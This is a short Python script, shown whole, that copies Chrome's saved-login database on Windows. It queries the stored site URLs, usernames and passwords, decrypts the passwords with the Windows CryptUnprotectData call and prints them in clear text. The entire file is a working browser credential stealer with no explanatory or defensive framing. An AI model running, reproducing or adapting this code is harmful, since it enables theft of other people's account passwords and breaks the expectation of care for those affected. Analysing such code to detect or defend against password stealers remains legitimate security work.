from os import getenv
import sqlite3
import win32crypt
from shutil import copyfile

path = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data"




path2 = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login2"
copyfile(path, path2)

conn = sqlite3.connect(path2)

cursor = conn.cursor()

cursor.execute('SELECT action_url, username_value, password_value FROM logins')


for raw in cursor.fetchall():

  password = win32crypt.CryptUnprotectData(raw[2])[1]
  details = raw[0] + '\n' + raw[1]
  high = details + '\n' + password
  print high

conn.close()
